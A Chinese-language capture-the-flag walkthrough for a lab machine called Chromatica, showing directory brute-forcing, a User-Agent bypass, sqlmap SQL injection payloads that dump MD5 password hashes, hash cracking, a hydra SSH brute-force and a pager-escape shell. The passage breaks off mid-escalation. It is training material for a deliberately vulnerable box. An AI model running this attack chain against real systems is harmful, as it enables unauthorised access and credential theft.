\n```\n\nChromatica\u4e0d\u77e5\u9053\u4ec0\u4e48\u4e1c\u897f\uff0c\u641c\u4e00\u4e0b\u6f0f\u6d1e\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit Chromatica      \nExploits: No Results\nShellcodes: No Results\n\n```\n\n\u6ca1\u6709\uff0c\u90a3\u5c31\u7206\u7834\u4e00\u4e0b\u76ee\u5f55\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://192.168.205.215/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404                       \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.215/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 280]\n/index.html           (Status: 200) [Size: 4047]\n/.html                (Status: 403) [Size: 280]\n/assets               (Status: 301) [Size: 319] [--> http://192.168.205.215/assets/]\n/css                  (Status: 301) [Size: 316] [--> http://192.168.205.215/css/]\n/js                   (Status: 301) [Size: 315] [--> http://192.168.205.215/js/]\n/javascript           (Status: 301) [Size: 323] [--> http://192.168.205.215/javascript/]\n/robots.txt           (Status: 200) [Size: 36]\nProgress: 25342 / 6369165 (0.40%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 29872 / 6369165 (0.47%)\n===============================================================\nFinished\n===============================================================\n\n```\n\n`/robots.txt`\u770b\u770b\u6709\u4ec0\u4e48\n\n![image](https://github.com/user-attachments/assets/d2dc4a4f-abca-4887-91d1-22205caca415)\n\n![image](https://github.com/user-attachments/assets/273a707d-7367-49f2-9b0a-04e9862dd39d)\n\n\u76f4\u63a5\u8bbf\u95ee\u88ab\u62e6\u622a\uff0c\u52a0\u4e0a\u7528\u6237\u4ee3\u7406`dev`\u6211\u8fd9\u4f7f\u7528\u7684\u662f`hackbar`\n\n![image](https://github.com/user-attachments/assets/f59b082c-f36c-45b3-85c9-d1b41d36438d)\n\n\u8bbf\u95ee\u6210\u529f\uff0c\u6709\u8f93\u5165\u6846\u8bd5\u8bd5sql\u6ce8\u5165\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sqlmap -u 'http://192.168.205.215/dev-portal/' --forms --batch --user-agent dev \n        ___\n       __H__                                                                                                                         \n ___ ___[)]_____ ___ ___  {1.8.12#stable}                                                                                              \n|_ -| . [,]     | .'| . |                                                                                                            \n|___|_  [,]_|_|_|__,|  _|                                                                                                            \n      |_|V...       |_|   https://sqlmap.org                                                                                         \n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 14:28:16 /2024-12-30/\n\n[14:28:16] [INFO] testing connection to the target URL\n[14:28:16] [INFO] searching for forms\n[1/1] Form:\nGET http://192.168.205.215/dev-portal/search.php?city=\ndo you want to test this form? [Y/n/q] \n> Y\nEdit GET data [default: city=]: city=\ndo you want to fill blank fields with random values? [Y/n] Y\n[14:28:16] [INFO] resuming back-end DBMS 'mysql' \n[14:28:16] [INFO] using '/home/kali/.local/share/sqlmap/output/results-12302024_0228pm.csv' as the CSV results file in multiple targets mode\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: city (GET)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: city=a' AND (SELECT 4754 FROM (SELECT(SLEEP(5)))EmlP) AND 'wTdJ'='wTdJ\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: city=a' UNION ALL SELECT NULL,CONCAT(0x716a7a7a71,0x44665871747363734657436a6b47695046565047526e5a454a7765706d7148534f4645566e445858,0x7178626b71),NULL,NULL-- -\n---\ndo you want to exploit this SQL injection? [Y/n] Y\n[14:28:16] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 22.04 (jammy)\nweb application technology: Apache 2.4.52\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\n[14:28:16] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-12302024_0228pm.csv'                                                                                                         \n\n[*] ending @ 14:28:16 /2024-12-30/\n\n                                                                    \n```\n\n\u4e00\u53d1\u5165\u9b42\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sqlmap -u 'http://192.168.205.215/dev-portal/' --forms --batch --user-agent dev -D Chromatica -T users -C username,password --dump\n        ___\n       __H__                                                                                                                         \n ___ ___[,]_____ ___ ___  {1.8.12#stable}                                                                                              \n|_ -| . [']     | .'| . |                                                                                                            \n|___|_  [']_|_|_|__,|  _|                                                                                                            \n      |_|V...       |_|   https://sqlmap.org                                                                                         \n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 14:31:19 /2024-12-30/\n\n[14:31:19] [INFO] testing connection to the target URL\n[14:31:19] [INFO] searching for forms\n[1/1] Form:\nGET http://192.168.205.215/dev-portal/search.php?city=\ndo you want to test this form? [Y/n/q] \n> Y\nEdit GET data [default: city=]: city=\ndo you want to fill blank fields with random values? [Y/n] Y\n[14:31:19] [INFO] resuming back-end DBMS 'mysql' \n[14:31:19] [INFO] using '/home/kali/.local/share/sqlmap/output/results-12302024_0231pm.csv' as the CSV results file in multiple targets mode\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: city (GET)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: city=a' AND (SELECT 4754 FROM (SELECT(SLEEP(5)))EmlP) AND 'wTdJ'='wTdJ\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: city=a' UNION ALL SELECT NULL,CONCAT(0x716a7a7a71,0x44665871747363734657436a6b47695046565047526e5a454a7765706d7148534f4645566e445858,0x7178626b71),NULL,NULL-- -\n---\ndo you want to exploit this SQL injection? [Y/n] Y\n[14:31:19] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 22.04 (jammy)\nweb application technology: Apache 2.4.52\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\n[14:31:19] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'Chromatica'\n[14:31:19] [INFO] recognized possible password hashes in column 'password'\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N\ndo you want to crack them via a dictionary-based attack? [y/N/q] N\nDatabase: Chromatica\nTable: users\n[5 entries]\n+-----------+----------------------------------+\n| username  | password                         |\n+-----------+----------------------------------+\n| admin     | 8d06f5ae0a469178b28bbd34d1da6ef3 |\n| dev       | 1ea6762d9b86b5676052d1ebd5f649d7 |\n| user      | 3dd0f70a06e2900693fc4b684484ac85 |\n| dev-selim | f220c85e3ff19d043def2578888fb4e5 |\n| intern    | aaf7fb4d4bffb8c8002978a9c9c6ddc9 |\n+-----------+----------------------------------+\n\n[14:31:19] [INFO] table 'Chromatica.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.205.215/dump/Chromatica/users.csv'                                                                                                                             \n[14:31:19] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-12302024_0231pm.csv'                                                                                                         \n\n[*] ending @ 14:31:19 /2024-12-30/\n\n                                                      \n```\n\n\u63d0\u53d6\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat tmp|awk -F ' ' '{print $2 ':' $4}' \n:\nusername:password\n:\nadmin:8d06f5ae0a469178b28bbd34d1da6ef3\ndev:1ea6762d9b86b5676052d1ebd5f649d7\nuser:3dd0f70a06e2900693fc4b684484ac85\ndev-selim:f220c85e3ff19d043def2578888fb4e5\nintern:aaf7fb4d4bffb8c8002978a9c9c6ddc9\n:\n:\n\n```\n\n\u76f4\u63a5\u590d\u5236\u5c31\u597d\u4e86\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat tmp1\nadmin:8d06f5ae0a469178b28bbd34d1da6ef3\ndev:1ea6762d9b86b5676052d1ebd5f649d7\nuser:3dd0f70a06e2900693fc4b684484ac85\ndev-selim:f220c85e3ff19d043def2578888fb4e5\nintern:aaf7fb4d4bffb8c8002978a9c9c6ddc9\n                                             \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt tmp1 --format=Raw-MD5\nUsing default input encoding: UTF-8\nLoaded 5 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])\nWarning: no OpenMP support for this hash type, consider --fork=12\nPress 'q' or Ctrl-C to abort, almost any other key for status\nkeeptrying       (user)   \n1g 0:00:00:00 DONE (2024-12-30 14:38) 1.785g/s 25613Kp/s 25613Kc/s 102933KC/s  fuckyooh21..*7\u00a1Vamos!\nUse the '--show --format=Raw-MD5' options to display all of the cracked passwords reliably\nSession completed. \n                    \n```\n\n\u7206\u4e0d\u51fa\u6765\u4e22[[crackstation](https://crackstation.net/)](https://crackstation.net/)\u770b\u6709\u6ca1\u6709\u7ed3\u679c\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat tmp1|awk -F ':' '{print $2}'\n8d06f5ae0a469178b28bbd34d1da6ef3\n1ea6762d9b86b5676052d1ebd5f649d7\n3dd0f70a06e2900693fc4b684484ac85\nf220c85e3ff19d043def2578888fb4e5\naaf7fb4d4bffb8c8002978a9c9c6ddc9\n\n```\n\n![image](https://github.com/user-attachments/assets/6c3f0b6d-209e-4810-81e7-674c868ae20d)\n\n\u6784\u5efa\u4e00\u4e0b`user`\u548c`pass`\u7206\u7834ssh\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat tmp1|awk -F ':' '{print $1}' > user\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat user                             \nadmin\ndev\nuser\ndev-selim\nintern\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat tmp1|awk -F ':' '{print $2}' > pass\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat pass                             \n8d06f5ae0a469178b28bbd34d1da6ef3\n1ea6762d9b86b5676052d1ebd5f649d7\n3dd0f70a06e2900693fc4b684484ac85\nf220c85e3ff19d043def2578888fb4e5\naaf7fb4d4bffb8c8002978a9c9c6ddc9\n\n#\u7136\u540e\u628acrackstation\u7ed3\u679c\u624b\u8f93\u8fdb\u53bb\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ vim pass\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat pass\n8d06f5ae0a469178b28bbd34d1da6ef3\n1ea6762d9b86b5676052d1ebd5f649d7\n3dd0f70a06e2900693fc4b684484ac85\nf220c85e3ff19d043def2578888fb4e5\naaf7fb4d4bffb8c8002978a9c9c6ddc9\nadm!n\nflaghere\nkeeptrying\nintern00\n                \n```\n\n\u5f53\u7136\u4f60\u628a\u90a3\u4e2a\u7f51\u683c\u590d\u5236\u4e0b\u6765\u8fc7\u6ee4\u4e5f\u884c\n\n### 3.ssh \u7206\u7834\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ hydra -L user -P pass ssh://192.168.205.215 -V -I -u -f -e nsr -t 64\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-30 14:44:49\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 60 tasks per 1 server, overall 60 tasks, 60 login tries (l:5/p:12), ~1 try per task\n[DATA] attacking ssh://192.168.205.215:22/\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'admin' - 1 of 60 [child 0] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'dev' - 2 of 60 [child 1] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'user' - 3 of 60 [child 2] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'dev-selim' - 4 of 60 [child 3] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'intern' - 5 of 60 [child 4] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '' - 6 of 60 [child 5] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '' - 7 of 60 [child 6] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass '' - 8 of 60 [child 7] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '' - 9 of 60 [child 8] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '' - 10 of 60 [child 9] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'nimda' - 11 of 60 [child 10] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'ved' - 12 of 60 [child 11] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'resu' - 13 of 60 [child 12] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'miles-ved' - 14 of 60 [child 13] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'nretni' - 15 of 60 [child 14] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 16 of 60 [child 15] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 17 of 60 [child 16] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 18 of 60 [child 17] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 19 of 60 [child 18] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 20 of 60 [child 19] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 21 of 60 [child 20] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 22 of 60 [child 21] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 23 of 60 [child 22] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 24 of 60 [child 23] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 25 of 60 [child 24] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '3dd0f70a06e2900693fc4b684484ac85' - 26 of 60 [child 25] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '3dd0f70a06e2900693fc4b684484ac85' - 27 of 60 [child 26] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass '3dd0f70a06e2900693fc4b684484ac85' - 28 of 60 [child 27] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '3dd0f70a06e2900693fc4b684484ac85' - 29 of 60 [child 28] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '3dd0f70a06e2900693fc4b684484ac85' - 30 of 60 [child 29] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'f220c85e3ff19d043def2578888fb4e5' - 31 of 60 [child 30] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'f220c85e3ff19d043def2578888fb4e5' - 32 of 60 [child 31] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'f220c85e3ff19d043def2578888fb4e5' - 33 of 60 [child 32] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'f220c85e3ff19d043def2578888fb4e5' - 34 of 60 [child 33] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'f220c85e3ff19d043def2578888fb4e5' - 35 of 60 [child 34] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 36 of 60 [child 35] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 37 of 60 [child 36] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 38 of 60 [child 37] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 39 of 60 [child 38] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 40 of 60 [child 39] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'adm!n' - 41 of 60 [child 40] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'adm!n' - 42 of 60 [child 41] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'adm!n' - 43 of 60 [child 42] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'adm!n' - 44 of 60 [child 43] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'adm!n' - 45 of 60 [child 44] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'flaghere' - 46 of 60 [child 45] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'flaghere' - 47 of 60 [child 46] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'flaghere' - 48 of 60 [child 47] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'flaghere' - 49 of 60 [child 48] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'flaghere' - 50 of 60 [child 49] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'keeptrying' - 51 of 60 [child 50] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'keeptrying' - 52 of 60 [child 51] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'keeptrying' - 53 of 60 [child 52] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'keeptrying' - 54 of 60 [child 53] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'keeptrying' - 55 of 60 [child 54] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'intern00' - 56 of 60 [child 55] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'intern00' - 57 of 60 [child 56] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'intern00' - 58 of 60 [child 57] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'intern00' - 59 of 60 [child 58] (0/0)\n[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'intern00' - 60 of 60 [child 59] (0/0)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'dev-selim' - 61 of 79 [child 8] (1/19)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'miles-ved' - 62 of 79 [child 6] (2/19)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'user' - pass '3dd0f70a06e2900693fc4b684484ac85' - 63 of 79 [child 7] (3/19)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'f220c85e3ff19d043def2578888fb4e5' - 64 of 79 [child 9] (4/19)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'user' - pass 'f220c85e3ff19d043def2578888fb4e5' - 65 of 80 [child 5] (5/20)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 66 of 80 [child 14] (6/20)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 67 of 81 [child 34] (7/21)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'intern00' - 68 of 82 [child 39] (8/22)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 69 of 82 [child 4] (9/22)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'intern00' - 70 of 83 [child 19] (10/23)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'intern' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 71 of 84 [child 44] (11/24)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass '3dd0f70a06e2900693fc4b684484ac85' - 72 of 84 [child 29] (12/24)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass '3dd0f70a06e2900693fc4b684484ac85' - 73 of 85 [child 54] (13/25)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'flaghere' - 74 of 86 [child 5] (14/26)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'flaghere' - 75 of 86 [child 8] (15/26)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'flaghere' - 76 of 86 [child 23] (16/26)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'keeptrying' - 77 of 86 [child 18] (17/26)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'intern00' - 78 of 86 [child 33] (18/26)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'intern00' - 79 of 86 [child 28] (19/26)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'f220c85e3ff19d043def2578888fb4e5' - 80 of 86 [child 43] (20/26)\n[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 81 of 87 [child 53] (21/27)\n[22][ssh] host: 192.168.205.215   login: dev   password: flaghere\n[STATUS] attack finished for 192.168.205.215 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-30 14:44:53\n                                                                                  \n```\n\n\u633a\u5feb\u7684\uff0c\u5c3186\u79cd\u53ef\u80fd\n\n### 4.\u63d0\u6743\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh dev@192.168.205.215                                                                                                         \ndev@192.168.205.215's password: \nGREETINGS,\nTHIS ACCOUNT IS NOT A LOGIN ACCOUNT\nIF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO\nEITHER CONTACT YOUR ADMIN\nOR THINK OUTSIDE THE BOX\nBE LAZY AND CONTACT YOUR ADMIN\nOR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,\nREGARDS\n\nbrightctf{ALM0ST_TH3R3_34897ffdf69}\nConnection to 192.168.205.215 closed.\n                                             \n\u7ffb\u8bd1\uff1a\n\u60a8\u597d\uff0c\n\u6b64\u5e10\u6237\u4e0d\u662f\u767b\u5f55\u5e10\u6237\n\u5982\u679c\u60a8\u60f3\u5bf9\u6b64\u5e10\u6237\u8fdb\u884c\u7ef4\u62a4\uff0c\u60a8\u5fc5\u987b\n\u8054\u7cfb\u60a8\u7684\u7ba1\u7406\u5458\n\u6216\u8df3\u51fa\u601d\u7ef4\u5b9a\u5f0f\n\u5077\u61d2\u5e76\u8054\u7cfb\u60a8\u7684\u7ba1\u7406\u5458\n\u6216\u8005\u4e5f\u8bb8\u60a8\u5e94\u8be5\u591a\u52a8\u52a8\u8111\u5b50\uff0c\u5475\u5475\uff0c\n\u95ee\u5019\n\nbrightctf{ALM0ST_TH3R3_34897ffdf69}\n\u4e0e 192.168.205.215 \u7684\u8fde\u63a5\u5df2\u5173\u95ed\u3002\n```\n\n\u628a\u6211\u8e22\u4e0b\u7ebf\u4e86\uff0c\u770b\u770b\u8be6\u7ec6\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh dev@192.168.205.215 -v\nOpenSSH_9.9p1 Debian-3, OpenSSL 3.3.2 3 Sep 2024\n......\ndev@192.168.205.215's password: \nAuthenticated to 192.168.205.215 ([192.168.205.215]:22) using 'password'.\ndebug1: channel 0: new session [client-session] (inactive timeout: 0)\ndebug1: Requesting no-more-sessions@openssh.com\ndebug1: Entering interactive session.\ndebug1: pledge: filesystem\ndebug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0\ndebug1: client_input_hostkeys: searching /home/kali/.ssh/known_hosts for 192.168.205.215 / (none)\ndebug1: client_input_hostkeys: searching /home/kali/.ssh/known_hosts2 for 192.168.205.215 / (none)\ndebug1: client_input_hostkeys: hostkeys file /home/kali/.ssh/known_hosts2 does not exist\ndebug1: client_input_hostkeys: no new or deprecated keys from server\ndebug1: Sending environment.\ndebug1: channel 0: setting env LANG = 'zh_CN.UTF-8'\ndebug1: pledge: fork\nGREETINGS,\nTHIS ACCOUNT IS NOT A LOGIN ACCOUNT\nIF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO\nEITHER CONTACT YOUR ADMIN\nOR THINK OUTSIDE THE BOX\nBE LAZY AND CONTACT YOUR ADMIN\nOR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,\nREGARDS\n\nbrightctf{ALM0ST_TH3R3_34897ffdf69}\ndebug1: client_input_channel_req: channel 0 rtype exit-status reply 0\ndebug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0\ndebug1: channel 0: free: client-session, nchannels 1\nConnection to 192.168.205.215 closed.\nTransferred: sent 3964, received 3860 bytes, in 0.4 seconds\nBytes per second: sent 11238.5, received 10943.6\ndebug1: Exit status 0\n                   \n\n\u7ffb\u8bd1\uff1a\n\u4f7f\u7528\u201c\u5bc6\u7801\u201d\u5411 192.168.205.215 ([192.168.205.215]:22) \u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\ndebug1\uff1a\u901a\u9053 0\uff1a\u65b0\u4f1a\u8bdd [client-session]\uff08\u975e\u6d3b\u52a8\u8d85\u65f6\uff1a0\uff09\ndebug1\uff1a\u8bf7\u6c42 no-more-sessions@openssh.com\ndebug1\uff1a\u8fdb\u5165\u4ea4\u4e92\u5f0f\u4f1a\u8bdd\u3002\ndebug1\uff1a\u627f\u8bfa\uff1a\u6587\u4ef6\u7cfb\u7edf\ndebug1\uff1aclient_input_global_request\uff1artype hostkeys-00@openssh.com want_reply 0\ndebug1\uff1aclient_input_hostkeys\uff1a\u5728 /home/kali/.ssh/known_hosts \u4e2d\u641c\u7d22 192.168.205.215 / (\u65e0)\ndebug1\uff1aclient_input_hostkeys\uff1a\u5728 /home/kali/.ssh/known_hosts2 \u4e2d\u641c\u7d22 192.168.205.215 / (\u65e0)\ndebug1\uff1aclient_input_hostkeys\uff1ahostkeys \u6587\u4ef6 /home/kali/.ssh/known_hosts2 \u4e0d\u5b58\u5728\ndebug1\uff1aclient_input_hostkeys\uff1a\u6ca1\u6709\u6765\u81ea\u670d\u52a1\u5668\u7684\u65b0\u5bc6\u94a5\u6216\u5f03\u7528\u7684\u5bc6\u94a5\ndebug1\uff1a\u6b63\u5728\u53d1\u9001\u73af\u5883\u3002\ndebug1\uff1a\u9891\u9053 0\uff1a\u8bbe\u7f6e\u73af\u5883\u8bed\u8a00 =\u201czh_CN.UTF-8\u201d\ndebug1\uff1a\u627f\u8bfa\uff1afork\n```\n\n\u521b\u5efa\u4e86\u4f1a\u8bdd\uff0c\u4e0d\u4f1a\u4e86\uff0c\u53bb\u770b\u4e86`HGBE`\u5927\u4f6c\u7684wp\uff0c\u539f\u6765\u662f\u90a3\u4e2a\u7f29\u5c0f\u63d0\u6743\u7684\u90a3\u4e2a\u4e1c\u897f\u554a\n\n![image](https://github.com/user-attachments/assets/4f9018e3-67e2-498e-9dff-ea74a21c3134)\n\n\u8f93\u5165`!/bin/bash`\u5c31\u53ef\u4ee5\u653e\u5927\u4e86\n\n![image](https://github.com/user-attachments/assets/e49d4e3a-a938-4ab1-9637-0d0dd1aa7983)\n\n\u4ed6\u662f\u8fd9\u6837\u5b9e\u73b0\u7684\uff0c\u53ef\u4ee5\u5b66\u4e60\u4e00\u4e0b\n\n![image](https://github.com/user-attachments/assets/960705b3-aedc-493a-8c1b-0f751fe82604)\n\n```bash\ndev@Chromatica:~$ ls -al\ntotal 72                                                                                                                             \ndrwxr-x--- 7 dev  dev  4096 Apr 18  2024 .                                                                        